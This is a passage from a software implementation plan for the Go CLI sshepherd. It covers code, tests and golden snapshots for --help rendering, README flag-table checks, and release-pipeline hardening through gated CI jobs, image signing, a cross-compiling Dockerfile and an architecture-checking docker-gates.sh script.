(Usage column check: the longest spelling is `      --config string` / `      --identity PATH`, 21 bytes. pflag pads to `maxlen+2`, so every usage starts at byte 24. These literals were computed with pflag's v1.0.9 formula: `Fprintln(line[:sidx], spaces(maxlen-sidx), usage)`.)

- [ ] **Step 2: Run them and see them fail.**

Run: `go test ./cmd/sshepherd -run 'FlagUsages|UsageTemplate'`
Expected: FAIL (build error), `undefined: flagUsages` and `undefined: usageTemplate`.

- [ ] **Step 3: Implement.** Create `cmd/sshepherd/usage.go`:

```go
package main

import (
	"strings"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

// usageTemplate is cobra's own default usage template with the Flags and
// Global Flags sections sent through flagUsages. It is derived from the
// cobra in go.mod, so a cobra upgrade keeps its layout;
// TestUsageTemplateRoutesBothFlagSections fails if the rewrite misses.
var usageTemplate = strings.NewReplacer(
	".LocalFlags.FlagUsages", "flagUsages .LocalFlags",
	".InheritedFlags.FlagUsages", "flagUsages .InheritedFlags",
).Replace((&cobra.Command{}).UsageTemplate())

// init registers flagUsages before any template is parsed: cobra parses
// usage templates lazily against its global function map.
func init() {
	cobra.AddTemplateFunc("flagUsages", flagUsages)
}

// plainBool hides IsBoolFlag from pflag's usage renderer. pflag v1.1.0
// appends "[=true|false]" to every value whose IsBoolFlag is true
// (flag.go:794), with no option to turn it off. It wraps a render-only
// copy; the parsed flag keeps its real value.
type plainBool struct{ pflag.Value }

// flagUsages renders fs exactly as pflag's FlagUsages does, minus the
// v1.1.0 bool suffix: `--yes`, not `--yes[=true|false]`. Order, hidden
// flags, varnames, defaults and alignment all stay pflag's own.
func flagUsages(fs *pflag.FlagSet) string {
	view := pflag.NewFlagSet("usage", pflag.ContinueOnError)
	view.SortFlags = fs.SortFlags
	fs.VisitAll(func(f *pflag.Flag) {
		c := *f
		if c.Value.Type() == "bool" {
			c.Value = plainBool{c.Value}
		}
		view.AddFlag(&c)
	})
	return view.FlagUsages()
}
```

Notes: `AddFlag` takes `&c` (a copy), so the source `*pflag.Flag` is never changed. Only `Type() == "bool"` is wrapped. `count` and `boolfunc` keep pflag's own rendering, because v1.1.0 only adds the suffix when the type is `"bool"`.

- [ ] **Step 4: Run them and see them pass.**

Run: `go test ./cmd/sshepherd -run 'FlagUsages|UsageTemplate'`
Expected: PASS.

---

#### Task 2: Wire the renderer into every command's `--help`

**Files:**
- Modify: `cmd/sshepherd/run.go` (`newRootCmd`, after line 214 `root.SetVersionTemplate(...)`)
- Test: `cmd/sshepherd/usage_test.go` (append)

- [ ] **Step 1: Write the failing test.** Append to `cmd/sshepherd/usage_test.go`, and add `"bytes"` to its imports:

```go
// helpCommands is the root ("") plus every user-facing command; the
// golden and no-suffix tests iterate it.
var helpCommands = []string{"", "audit", "import", "adopt", "apply", "revoke", "rotate"}

// helpOutput runs `sshepherd [name] --help` and returns stdout.
func helpOutput(t *testing.T, name string) string {
	t.Helper()
	args := []string{"--help"}
	if name != "" {
		args = []string{name, "--help"}
	}
	var out, errBuf bytes.Buffer
	if code := run(args, &out, &errBuf); code != 0 {
		t.Fatalf("%v exit = %d, stderr: %s", args, code, errBuf.String())
	}
	return out.String()
}

// TestHelpHasNoBoolValueSuffix: no command's --help shows pflag v1.1.0's
// [=true|false] suffix, in Flags or Global Flags (UX-13/UX-2).
func TestHelpHasNoBoolValueSuffix(t *testing.T) {
	for _, name := range helpCommands {
		got := helpOutput(t, name)
		if strings.Contains(got, "[=true|false]") {
			t.Errorf("%q --help renders a bool value suffix:\n%s", name, got)
		}
		if !strings.Contains(got, "  -h, --help ") {
			t.Errorf("%q --help lacks a plain `-h, --help` line:\n%s", name, got)
		}
	}
}
```

- [ ] **Step 2: Run it and see it fail.**

Run: `rtk proxy go test ./cmd/sshepherd -run TestHelpHasNoBoolValueSuffix`
Expected: FAIL for all 7 entries. The output shows lines such as `-h, --help[=true|false]` and `--version[=true|false]` (root), and `--json[=true|false]` (apply).

- [ ] **Step 3: Implement.** In `cmd/sshepherd/run.go` `newRootCmd`, right after `root.SetVersionTemplate("sshepherd {{.Version}}\n")`:

```go
	root.SetUsageTemplate(usageTemplate) // bool flags without pflag v1.1.0's [=true|false]; see usage.go
```

- [ ] **Step 4: Run it and see it pass.**

Run: `go test ./cmd/sshepherd -run 'TestHelp|FlagUsages|UsageTemplate'`
Expected: PASS. Also check by eye with `go run ./cmd/sshepherd --help`. The root `Flags:` block must read exactly:

```
      --color string   colorize output: auto, always, or never (default "auto")
  -h, --help           help for sshepherd
  -q, --quiet          log errors only
  -v, --verbose        enable debug logging
      --version        version for sshepherd
```

---

#### Task 3: README sync test covers import, the global flags, and defaults (TST-4)

**Files:**
- Modify: `cmd/sshepherd/help_readme_test.go` (replace lines 14-33 `readmeFlagCells` and 50-85 `TestHelpMatchesREADMETables`; keep `helpFlagCell` lines 35-48 and `TestHelpShowsIdentityVarnames`)
- Modify: `cmd/sshepherd/import.go:433-434` (`--merge` usage)
- Delta for the integrator: `README.md` (`## Commands` intro, README.md:318-323)

- [ ] **Step 1: Write the failing test.** Replace `readmeFlagCells` and `TestHelpMatchesREADMETables`. Add `"cmp"` to the imports and drop `"github.com/spf13/cobra"`, which the new code no longer names (goimports would flag it, and the build fails on an unused import):

```go
// readmeFlagRow is one row of a README flag table: its flag cell and its
// default cell, e.g. {"`--parallel`", "`32`"}.
type readmeFlagRow struct{ flag, def string }

// readmeFlagRows returns the flag-table rows under the README heading line
// that equals heading exactly, up to the next heading.
func readmeFlagRows(t *testing.T, readme, heading string) []readmeFlagRow {
	t.Helper()
	_, section, ok := strings.Cut(readme, "\n"+heading+"\n")
	if !ok {
		t.Fatalf("README has no %q heading", heading)
	}
	if i := strings.Index(section, "\n#"); i >= 0 {
		section = section[:i]
	}
	var rows []readmeFlagRow
	for _, line := range strings.Split(section, "\n") {
		if !strings.HasPrefix(line, "| `-") {
			continue
		}
		cells := strings.Split(line, "|")
		rows = append(rows, readmeFlagRow{strings.TrimSpace(cells[1]), strings.TrimSpace(cells[2])})
	}
	return rows
}

// zeroDefaultWords are the README's words for "no default value".
var zeroDefaultWords = []string{"none", "—", "all", "stdout"}

// defaultMatches reports whether a README default cell spells f's --help
// default: off/on for a bool, one of zeroDefaultWords for an unset value,
// otherwise the default itself in backticks.
func defaultMatches(f *pflag.Flag, cell string) bool {
	switch {
	case f.Value.Type() == "bool":
		return cell == map[string]string{"false": "off", "true": "on"}[f.DefValue]
	case f.DefValue == "" || f.DefValue == "[]":
		return slices.Contains(zeroDefaultWords, cell)
	default:
		return cell == "`"+f.DefValue+"`"
	}
}

// TestHelpMatchesREADMETables: for the root and every command, the README
// table lists exactly the flags --help shows (varnames included), and each
// row's default matches the flag's --help default (TST-4).
func TestHelpMatchesREADMETables(t *testing.T) {
	raw, err := os.ReadFile("../../README.md")
	if err != nil {
		t.Fatalf("README: %v", err)
	}
	readme := string(raw)
	var out, errBuf bytes.Buffer
	root := newRootCmd(&app{}, &out, &errBuf)
	root.InitDefaultVersionFlag() // cobra adds --version lazily at Execute
	tables := []struct{ name, heading string }{
		{"", "### Global flags"},
		{"audit", "### `sshepherd audit`"},
		{"import", "### `sshepherd import [ssh-config-path]`"},
		{"adopt", "### `sshepherd adopt`"},
		{"apply", "### `sshepherd apply`"},
		{"revoke", "### `sshepherd revoke`"},
		{"rotate", "### `sshepherd rotate`"},
	}
	for _, tc := range tables {
		t.Run(cmp.Or(tc.name, "root"), func(t *testing.T) {
			cmd := root
			if tc.name != "" {
				cmd = nil
				for _, c := range root.Commands() {
					if c.Name() == tc.name {
						cmd = c
					}
				}
				if cmd == nil {
					t.Fatalf("no %s command", tc.name)
				}
			}
			rows := readmeFlagRows(t, readme, tc.heading)
			defaults := map[string]string{}
			var got []string
			for _, r := range rows {
				got = append(got, r.flag)
				defaults[r.flag] = r.def
			}
			var want []string
			cmd.LocalFlags().VisitAll(func(f *pflag.Flag) {
				if f.Name == "help" || f.Hidden {
					return
				}
				cell := helpFlagCell(f)
				want = append(want, cell)
				if def, ok := defaults[cell]; ok && !defaultMatches(f, def) {
					t.Errorf("README default for %s = %s; --help default is %q", cell, def, f.DefValue)
				}
			})
			slices.Sort(want)
			slices.Sort(got)
			if !slices.Equal(got, want) {
				t.Errorf("README table for %s = %v\n--help flags        = %v", cmp.Or(tc.name, "root"), got, want)
			}
		})
	}
}
```

Notes:
- The root's `LocalFlags()` includes its persistent flags (`-v`, `-q`, `--color`) and, after `InitDefaultVersionFlag`, `--version`. `help` stays excluded as before.
- Only cells 1 and 2 are read, so a `|` in a description cell is harmless. Still, avoid `auto|always|never` in a cell: unescaped pipes break the Markdown table itself.

- [ ] **Step 2: Run it and see it fail.**

Run: `rtk proxy go test ./cmd/sshepherd -run TestHelpMatchesREADMETables -v`
Expected: FAIL on two subtests:
- `root`: `README has no "### Global flags" heading`.
- `import`: `README table for import = [… \`--merge FILE\` …] / --help flags = [… \`--merge\` …]`. The usage at import.go:434 has no backticked varname, so `--help` prints `--merge string`.

The `audit`/`adopt`/`apply`/`revoke`/`rotate` subtests should PASS, defaults included. If one fails on a default, the README is wrong: record the row for the integrator delta and do not weaken `defaultMatches`.

- [ ] **Step 3: Fix the `--merge` varname.** In `cmd/sshepherd/import.go:433-434`:

```go
	cmd.Flags().StringVar(&mergePath, "merge", "",
		"merge into the existing manifest `FILE`: preserve its text (comments intact) and append only what is new")
```

`pflag.UnquoteUsage` turns this into `--merge FILE   merge into the existing manifest FILE: …`, which matches README.md:473.

- [ ] **Step 4: Apply the README delta (integrator-owned; apply it in your worktree to go green and stage it as a separate hunk).** Replace README.md:320-323, the prose paragraph under `## Commands`, with:

```markdown
Reports go to **stdout**; logs, warnings, and the confirmation prompt go to **stderr** —
so `sshepherd apply > plan.txt` captures exactly the report.

### Global flags

These work on every command.

| Flag | Default | Description |
| ---- | ------- | ----------- |
| `-v, --verbose` | off | Debug logging (per-SSH-stage detail); cannot be combined with `--quiet` |
| `-q, --quiet` | off | Log errors only |
| `--color` | `auto` | Colorize output: `auto`, `always`, or `never` |
| `--version` | off | Print the version and exit |
```

(`-v`/`-q` are mutually exclusive at run.go:219. The color values come from run.go:218.)

- [ ] **Step 5: Run it and see it pass.**

Run: `go test ./cmd/sshepherd -run 'TestHelp'`
Expected: PASS (`TestHelpMatchesREADMETables/*`, `TestHelpShowsIdentityVarnames`, `TestHelpHasNoBoolValueSuffix`).

- [ ] **Step 6: Mutation check (proves the defaults comparison works; revert afterwards).** Temporarily change `defaultParallel = 32` to `8` at `cmd/sshepherd/audit.go:23`, then run `rtk proxy go test ./cmd/sshepherd -run TestHelpMatchesREADMETables`. Expected: FAIL with `README default for \`--parallel\` = \`32\`; --help default is "8"` in audit, adopt, apply, revoke and rotate. Then `git checkout cmd/sshepherd/audit.go` (P01 does not own audit.go, so it must not be in the diff).

---

#### Task 4: Golden snapshot of every `--help`

**Files:**
- Create: `cmd/sshepherd/help_golden_test.go`
- Create: `cmd/sshepherd/testdata/help/{root,audit,import,adopt,apply,revoke,rotate}.golden`

- [ ] **Step 1: Write the failing test.** Create `cmd/sshepherd/help_golden_test.go`:

```go
package main

import (
	"cmp"
	"os"
	"path/filepath"
	"testing"
)

// TestHelpGolden snapshots the full --help of the root and every command,
// so a dependency bump that changes user-facing help text fails CI.
// Regenerate with: go test ./cmd/sshepherd -run TestHelpGolden -update
// and read the diff before accepting it.
func TestHelpGolden(t *testing.T) {
	if *update {
		if err := os.MkdirAll(filepath.Join("testdata", "help"), 0o750); err != nil {
			t.Fatal(err)
		}
	}
	for _, name := range helpCommands {
		label := cmp.Or(name, "root")
		t.Run(label, func(t *testing.T) {
			checkGolden(t, filepath.Join("help", label+".golden"), []byte(helpOutput(t, name)))
		})
	}
}
```

It reuses `update`/`checkGolden` from `cmd/sshepherd/import_test.go:17-34` and `helpCommands`/`helpOutput` from Task 2. `--help` output is deterministic: pflag's `FlagUsages()` does no terminal-width wrapping, defaults are literal (`~/.ssh/known_hosts` is not expanded), and help is never colored.

- [ ] **Step 2: Run it and see it fail.**

Run: `rtk proxy go test ./cmd/sshepherd -run TestHelpGolden`
Expected: FAIL in all 7 subtests with `read golden (run with -update first): open testdata/help/<name>.golden: no such file or directory`.

- [ ] **Step 3: Generate, then read every golden back by eye.**

Run: `go test ./cmd/sshepherd -run TestHelpGolden -update`, then `cat cmd/sshepherd/testdata/help/*.golden`. Check:
- `grep -c 'true|false' cmd/sshepherd/testdata/help/*.golden` prints 0 for every file.
- `import.golden` shows `--merge FILE` and `--operator stringArray`.
- Every `Flags:` and `Global Flags:` block has one aligned usage column.
- Defaults: `(default "sshepherd.yaml")`, `(default "~/.ssh/known_hosts")`, `(default 32)`, `(default "auto")`.

- [ ] **Step 4: Run it and see it pass (without `-update`).**

Run: `go test ./cmd/sshepherd -run TestHelpGolden`
Expected: PASS.

---

#### Task 5: Prove the output is byte-identical to pflag v1.0.9 (verification only, no repo changes)

- [ ] **Step 1:** Build HEAD with pflag pinned back in a throwaway worktree, and diff it against the new goldens:

```sh
REPO=$(git rev-parse --show-toplevel)
WT=$(mktemp -d)/pflag109
git -C "$REPO" worktree add --detach "$WT" HEAD
( cd "$WT" && go get github.com/spf13/pflag@v1.0.9 && go build -o "$WT/old" ./cmd/sshepherd )
for c in root audit import adopt apply revoke rotate; do
  if [ "$c" = root ]; then "$WT/old" --help; else "$WT/old" "$c" --help; fi > "$WT/$c.txt"
  diff -u "$WT/$c.txt" "$REPO/cmd/sshepherd/testdata/help/$c.golden" || true
done
git -C "$REPO" worktree remove --force "$WT"
```

Expected: no diff, except the one `--merge` line in `import` (`string` becomes `FILE`, with the new wording). The column does not move because `--operator stringArray` is the longest spelling in import. Any other difference means the template path differs from cobra's `defaultUsageFunc`, so stop and investigate. `pflag@v1.0.9` is already in the module cache (`$(go env GOMODCACHE)/github.com/spf13/pflag@v1.0.9`). If the sandbox has no network, prefix with `GOFLAGS=-mod=mod GOPROXY=off`.

- [ ] **Step 2:** `make check` (fmt, goimports, vet, golangci-lint, deadcode, gosec, govulncheck, gitleaks, race tests, coverage gate).

---

#### Engineering fallback (no owner decision; only if a later cobra upgrade breaks the renderer)

Pin `github.com/spf13/pflag v1.0.9` in `go.mod` (`go get github.com/spf13/pflag@v1.0.9 && go mod tidy`; cobra v1.10.2 itself requires v1.0.9, as go.sum:16 shows). Dependabot must also stop proposing the bump. That change is in `.github/dependabot.yml`, which **P02 owns**, so the integrator adds it:

```yaml
    ignore:
      - dependency-name: "github.com/spf13/pflag"
        versions: [">= 1.1.0"]
```

Used only as a rollback if `TestUsageTemplateRoutesBothFlagSections` fails after a cobra upgrade and the renderer cannot be fixed in the same commit. It freezes pflag fixes and will break once a cobra release requires pflag ≥ 1.1. The golden and README tests (Tasks 3–4) stay required either way. (Review panel, product-ux: the earlier "if the owner rejects the renderer" wording implied an unasked owner choice; the renderer restores the pre-Dependabot `--help` exactly, so there is nothing to choose.)

#### Risks and how they are covered

| Risk | Mitigation |
|---|---|
| A cobra upgrade changes `defaultUsageTemplate` text so the `Replacer` misses. | `TestUsageTemplateRoutesBothFlagSections` fails. The goldens also change. |
| The template path renders differently from cobra's `defaultUsageFunc`. | Task 5 byte-diff against pflag v1.0.9. |
| A future pflag changes the suffix condition (e.g. checks `NoOptDefVal`). | `TestHelpHasNoBoolValueSuffix` and the goldens fail on the bump PR. |
| `init()` mutates cobra's global `templateFuncs`. | Registered once at package init, before any template is parsed or executed; no data race (`cmd/sshepherd` tests don't use `t.Parallel`, and init precedes them anyway). |
| A rendering copy leaks into parsing. | `TestFlagUsagesLeavesSourceFlagsUntouched`. |
| The docker smoke (`scripts/docker-gates.sh:11` runs `--help`) breaks. | Only text changes; exit code unchanged. |

Unit tests cover everything. `make integration` and E2E are unaffected (no flag or behavior change), but the integrator still runs them per the workflow.

#### Integrator handoff

- Apply the README hunk from Task 3 Step 4. Also check the README import table row for `--merge FILE`: it is unchanged and now true.
- `CLAUDE.md` Status: one sentence, e.g. "`--help` is snapshot-tested (`cmd/sshepherd/testdata/help/*.golden`); bool flags render without pflag v1.1.0's `[=true|false]` via `cmd/sshepherd/usage.go`, and the README flag tables (global flags included) are checked against `--help`, defaults included."
- Commit message, for example: `fix(cli): restore plain bool flags in --help; snapshot every --help and check README defaults (UX-13, UX-2, TST-4)`.

#### Acceptance

```sh
go test ./cmd/sshepherd -run 'TestHelp|FlagUsages|UsageTemplate' -v   # all PASS
go test ./cmd/sshepherd -run TestHelpGolden                            # PASS without -update
! grep -l 'true|false' cmd/sshepherd/testdata/help/*.golden            # no file matches
go run ./cmd/sshepherd import --help | grep -- '--merge FILE'          # present
make check                                                             # green, coverage gate included
make integration                                                       # green (run by the integrator)
```

Plus: the Task 5 byte-diff shows only the `--merge` line, and the Task 3 Step 6 mutation fails as expected and is then reverted.

#### Out of scope

- Flag renames and help-wording changes from **UX-7 / D26** (e.g. `import --operator` → `--operator-key`, the `--merge`/`--server` meanings). Those belong to P06, which must regenerate `testdata/help/*.golden` and the README tables in the same commit.
- Backticked varnames for other flags (e.g. `--operator FILE`, `--server NAME`, `--config FILE`). These are cosmetic and would churn README cells; leave them for P06's flag pass.
- Wrapping help to terminal width, help colorization, and changes to `completion`/`help` commands.
- Comparing README description cells with `--help` usage text: README descriptions are deliberately paraphrased.
- Pinning pflag (fallback only), and any `.github/dependabot.yml` change (P02's file).

---

### P02 — Gate releases on CI and scans, build the image once, harden supply chain and the container docs

> **Program notes (master plan):** P13 (W2) builds on these workflow files and must keep `go-version-file: go.mod`. The CI check names change; D6 is asked after this lands, with the trunk-based caveat (see Owner decisions).

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this package task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Kind:** fix · **Wave:** 0 · **depends_on:** none

**Goal:** A `v*` tag can only publish a signed image when its commit is on `master`, `make check` (with `govulncheck`) and `make integration` pass, and the one multi-arch image that is pushed has passed hadolint, Trivy, dockle and `scripts/docker-gates.sh` on both architectures. The image is built once, arm64 is cross-compiled, and the bytes that were gated are the bytes that get signed. CI checks the same Go version that ships, the daily job scans the published image, Dependabot waits 7 days before proposing new releases, and the README's verify and CronJob examples are tight.

**Architecture:** `release.yml` becomes six jobs: `verify-ref` → (`check` ∥ `integration` ∥ `image`) → `gate` (a matrix over native amd64 and arm64 runners) → `publish`. Only `publish` holds `id-token: write`. It runs only on tag refs, tags the gated digest with `imagetools create`, checks that the digest did not change, signs it, and then runs the exact `cosign verify` command from the README. The Dockerfile build stage runs on `$BUILDPLATFORM` and cross-compiles with `GOOS/GOARCH=$TARGETOS/$TARGETARCH`. `docker-gates.sh` gains `[--platform OS/ARCH] [--pull] [IMAGE]` and an ELF-header architecture gate. CI's `setup-go` reads `go-version-file: go.mod`, and a lockstep step requires go.mod, the Dockerfile build stage and the active Go to name the same patch release.

**Tech Stack:** GitHub Actions (SHA-pinned), docker buildx / BuildKit, GHCR, cosign keyless, Trivy 0.72.0, dockle 0.4.15, hadolint, bash, `yq` v4.54.1 and `actionlint` v1.7.12 for verification only.

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| SEC-6 | LOW | release.yml publishes and signs on any `v*` tag without tests or CVE scans. |
| OPS-1 | MEDIUM | Same gap as SEC-6, plus tags on side-branch commits. No `needs:`, no CI on tags, no tag ruleset (the ruleset part is owner action D6). |
| OPS-3 | MEDIUM | Released and already-published images are never Trivy-scanned. CI's floating `go-version: "1.27"` means govulncheck checks a different stdlib than the shipped `golang:1.27.3`. |
| OPS-4 | LOW | arm64 compiles under QEMU and is never run. The gated image (a separate `load: true` build) is not the pushed artifact. |
| OPS-6 | LOW | Dependabot has no `cooldown:`, so a freshly published malicious release is proposed within days. |
| OPS-2 | LOW | README `cosign verify` accepts a signature from any workflow on any ref (`--certificate-identity-regexp '^https://github.com/javadh75/SSHepherd/'`, README.md:1499). |
| OPS-11 | LOW | README Kubernetes CronJob runs unattended `apply --yes` from `:latest` with only `fsGroup` (README.md:1300-1316). |
| UX-12 | LOW | CLAUDE.md container section is stale. **At HEAD this is mostly already fixed:** d059d45 rewrote CLAUDE.md:174-206 to distroless with no tini and no openssh-client, plus the signal rationale. The finding was taken from an older injected copy. What remains is the cross-compile, release-gate and toolchain-lockstep wording, plus the stale "Target **Go 1.22+**" (CLAUDE.md:82). |

None of these overlap the on-hold items (prune, `apply --force`, `import --prefer`, keygen/scheduled rotation, move-key, wipe mode). P02 changes no product behavior or manifest schema, so it needs **no design spec or owner decision before implementation**. The only owner action is D6, which comes after the package lands. See "Owner follow-ups".

#### Files owned

- `.github/workflows/release.yml` (rewrite)
- `.github/workflows/ci.yml`
- `.github/dependabot.yml`
- `Dockerfile`
- `scripts/docker-gates.sh`
- The integrator only, in the wave-0 integration commit: `README.md` (Kubernetes CronJob block ~1300-1316, dev "Container work" paragraph ~1485-1491, "Releases" paragraph ~1493-1501) and `CLAUDE.md` (Container image section 174-206, CI paragraph ~140-145, line 82, Status).

**Not touched (owned by others):** `Makefile` (P13; `make smoke` keeps working because the script still honors `IMAGE` from the environment), `scripts/integration.sh` (P03; release.yml only calls `make integration`).

#### Grounding (current code)

- `release.yml:6-8`: `on: push: tags: ["v*"]`. One job `image` (`:17`), no `needs:`, and `packages: write` + `id-token: write` on the whole job (`:21-23`).
- `release.yml:37-48`: a separate native `load: true` build of `sshepherd:release-gate`, then `docker-gates.sh`. `:66-78`: a **second** multi-arch build-push. QEMU is set up at `:29`.
- `release.yml:80-88`: `cosign sign` by digest. Nothing verifies the signature afterwards.
- `Dockerfile:5`: `FROM golang:1.27.3-alpine@sha256:fa3d… AS build` with no `--platform`. `:20-22`: `go build` with no GOOS/GOARCH. The runtime stage (`:31-36`) has **no `RUN`**, so once the build stage is cross-compiled, the multi-arch build needs no emulation at all.
- `ci.yml:29,105,120`: `go-version: "1.27"`. `ci.yml:53-94`: `docker` is amd64 only and skipped on schedule. `ci.yml:111-134`: `scheduled` runs `make vuln` + fuzz only.
- `dependabot.yml:7-29`: three ecosystems, weekly, no `cooldown`.
- `docker-gates.sh:7`: `IMAGE="${IMAGE:?…}"` from the environment only. No platform support. User check through `docker image inspect` (`:28`), which is ambiguous for multi-arch refs under the containerd store.
- `go.mod:3`: `go 1.27.3`. No `toolchain` line, so `setup-go` with `go-version-file` resolves to exactly 1.27.3.
- The repo is **PUBLIC** (`gh repo view`), so the native `ubuntu-24.04-arm` runners are available and the arm64 gate can run without QEMU.
- The pinned `aquasec/trivy:0.72.0@sha256:cffe…` and `goodwithtech/dockle:v0.4.15@sha256:eade…` are both multi-arch indexes with linux/arm64 (checked with `imagetools inspect --raw`), so the arm runner can use the same pins.
- `hadolint` 2.15.1 accepts `FROM --platform=$BUILDPLATFORM` (checked by piping the modified Dockerfile through `hadolint -`, exit 0).

#### Execution model (parallel, disjoint files)

| Owner | Tasks | Files (exclusive) |
|---|---|---|
| **Agent A** (worktree) | A1-A2 | `Dockerfile`, `scripts/docker-gates.sh` |
| **Agent B** (worktree) | B1-B3 | `.github/dependabot.yml`, `.github/workflows/ci.yml`, `.github/workflows/release.yml` |
| **Integrator** | I1-I3 | applies both diffs, plus `README.md` and `CLAUDE.md` sections listed above. Runs all gates and commits once. |
| **Verifier** (independent) | V1 | read-only. Re-runs Acceptance, checks the digest/identity/needs invariants, and diffs README against release.yml. |

**Contract fixed up front (B codes against it, A implements it):**
`scripts/docker-gates.sh [--platform OS/ARCH] [--pull] [IMAGE]`. A positional `IMAGE` overrides `$IMAGE`. `--platform` defaults to `linux/<daemon arch>`. `--pull` runs `docker pull --platform … IMAGE` first. The exit code is non-zero on any failed gate. Gates run in this order: ELF architecture, `--version`/`--help`, size, non-root, PID-1 SIGTERM.

Rules: no commits by agents. Toolchain: `GOTOOLCHAIN=go1.27.3`. Use `rtk proxy <cmd>` when exact output lines matter. Agents may use their own scratchpad for throwaway Dockerfiles and logs, never the repo.

---

#### Task A1: Cross-compile the build stage (OPS-4)

**Files:** Modify `Dockerfile:5` and `Dockerfile:18-22`.

- [ ] **Step 1: Failing check.** The build stage must run on the build platform. BuildKit labels a cross stage `[<buildplatform>-><target arch> build …]`:

```bash
docker buildx create --name sshepherd-cross --driver docker-container >/dev/null 2>&1 || true
docker buildx build --builder sshepherd-cross --platform linux/amd64,linux/arm64 \
  --progress plain --output type=cacheonly . 2>&1 | grep -cE '\[linux/(amd64|arm64)->(amd64|arm64) build'
```

Expected now: `0` (exit 1). Both legs show `[linux/amd64 build …]` / `[linux/arm64 build …]`, and the foreign leg runs under emulation.

- [ ] **Step 2: Implement.**

```dockerfile
# Cross-compile: the Go toolchain runs on the build host's platform and emits
# the target's binary (pure Go, CGO off), so a multi-arch build never runs the
# compiler under QEMU. The runtime stage has no RUN, so it needs no emulation.
FROM --platform=$BUILDPLATFORM golang:1.27.3-alpine@sha256:fa3d596898d9f126af7c01d14ee7597bab3f39cccf392ef36b69fe77cd681f18 AS build
```

and replace `Dockerfile:18-22` with:

```dockerfile
ARG VERSION=dev
# Set by BuildKit from --platform (or the daemon's platform for a plain build).
ARG TARGETOS TARGETARCH
# Reproducible, fully static binary (CGO off) so it runs on a minimal base.
RUN CGO_ENABLED=0 GOOS=$TARGETOS GOARCH=$TARGETARCH go build -trimpath \
      -ldflags="-s -w -X main.version=${VERSION}" \
      -o /out/sshepherd ./cmd/sshepherd
```

Also extend the runtime-stage comment (`Dockerfile:24-30`) with one line: "Keep this stage free of RUN: release builds do not install QEMU."

- [ ] **Step 3: Passing.** The Step 1 command prints `≥2`: one cross leg per foreign platform, and the native leg shows no arrow. On an Apple-silicon host expect `[linux/arm64->amd64 build …]`. Then run `hadolint Dockerfile` (exit 0) and `docker buildx rm sshepherd-cross`.

**Risk:** If a later change adds `RUN` to the runtime stage, the release `image` job fails, because it has no QEMU. That is intended as a tripwire, and the comment states it.

#### Task A2: `docker-gates.sh`: platform-aware, pullable, ELF architecture gate (OPS-4)

**Files:** Modify `scripts/docker-gates.sh` (full rewrite below).

- [ ] **Step 1: Failing tests** (run after `make docker`, which builds `sshepherd:dev`):

```bash
# T1: the new interface
./scripts/docker-gates.sh --platform "linux/$(docker version -f '{{.Server.Arch}}')" sshepherd:dev
# now: "IMAGE: pass an image ref or set IMAGE" / "set IMAGE to the image to check" → exit 1

# T2: a wrong-arch binary must fail. Build an image whose build stage forgets GOARCH,
# labelled as the *foreign* platform (on arm64 hosts: amd64; on amd64: arm64).
foreign=linux/amd64; [ "$(docker version -f '{{.Server.Arch}}')" = amd64 ] && foreign=linux/arm64
sed 's/GOOS=\$TARGETOS GOARCH=\$TARGETARCH //' Dockerfile > "$SCRATCH/Dockerfile.noarch"
docker buildx build --platform "$foreign" -f "$SCRATCH/Dockerfile.noarch" --load -t sshepherd:wrongarch .
./scripts/docker-gates.sh --platform "$foreign" sshepherd:wrongarch; echo "exit=$?"
# want: "FAIL: /usr/local/bin/sshepherd is ELF machine N, want M for $foreign", exit=1
# (today the script has no --platform and no arch gate; --version would even pass
#  on Docker Desktop/QEMU, which is why the ELF check is needed)
```

- [ ] **Step 2: Implement.** Replace the script with:

```bash
#!/usr/bin/env bash
# Runtime gates for a built image, shared by `make smoke`, CI and the release
# workflow so they can never disagree: the binary is built for the image's
# platform, runs (--version, --help), the image stays under the size budget,
# does not run as root, and stops on a second SIGTERM as PID 1.
#
# Usage: docker-gates.sh [--platform OS/ARCH] [--pull] [IMAGE]
#   IMAGE defaults to $IMAGE. --platform picks one variant of a multi-arch
#   image (default: the daemon's own platform). --pull fetches that variant
#   first, for registry refs such as ghcr.io/javadh75/sshepherd@sha256:….
set -euo pipefail

platform="" pull=false
while [ $# -gt 0 ]; do
  case "$1" in
    --platform) platform="${2:?--platform needs OS/ARCH}"; shift 2 ;;
    --platform=*) platform="${1#--platform=}"; shift ;;
    --pull) pull=true; shift ;;
    -h | --help) sed -n '2,11p' "$0"; exit 0 ;;
    -*) echo "docker-gates.sh: unknown option $1" >&2; exit 2 ;;
    *) IMAGE="$1"; shift ;;
  esac
done
IMAGE="${IMAGE:?pass an image ref or set IMAGE}"
SIZE_BUDGET_MB="${SIZE_BUDGET_MB:-30}"
BIN=/usr/local/bin/sshepherd

native="linux/$(docker version -f '{{.Server.Arch}}')"
platform="${platform:-$native}"
plat=(--platform "$platform")
# An emulated (QEMU) variant starts slower: give the PID-1 gate more time.
settle=1 polls=10
if [ "$platform" != "$native" ]; then settle=5 polls=40; fi

cid="" sig=""
cleanup() {
  local ids=()
  if [ -n "$cid" ]; then ids+=("$cid"); fi
  if [ -n "$sig" ]; then ids+=("$sig"); fi
  if [ "${#ids[@]}" -gt 0 ]; then docker rm -f "${ids[@]}" >/dev/null 2>&1 || true; fi
}
trap cleanup EXIT

if $pull; then docker pull -q "${plat[@]}" "$IMAGE" >/dev/null; fi

# Architecture first: with a cross-compiling Dockerfile, a lost GOARCH puts a
# build-host binary in a foreign-labelled image, and on a host of the binary's
# own arch it would still run. So read the ELF e_machine (offset 18; LE hosts)
# instead of trusting --version.
case "$platform" in
  linux/amd64) want=62 ;;  # EM_X86_64
  linux/arm64) want=183 ;; # EM_AARCH64
  *) echo "FAIL: no ELF machine known for platform $platform" >&2; exit 1 ;;
esac
cid=$(docker create "${plat[@]}" "$IMAGE")
got=$(docker cp "$cid:$BIN" - | tar -xOf - | { od -An -t u2 -j 18 -N 2; cat >/dev/null; } | tr -d ' ')
if [ "$got" != "$want" ]; then
  echo "FAIL: $BIN is ELF machine $got, want $want for $platform" >&2
  exit 1
fi
echo "ok: $BIN is built for $platform"

docker run --rm "${plat[@]}" "$IMAGE" --version
docker run --rm "${plat[@]}" "$IMAGE" --help >/dev/null
echo "ok: --version and --help run"

# Measure the unpacked root filesystem (export of a never-started container):
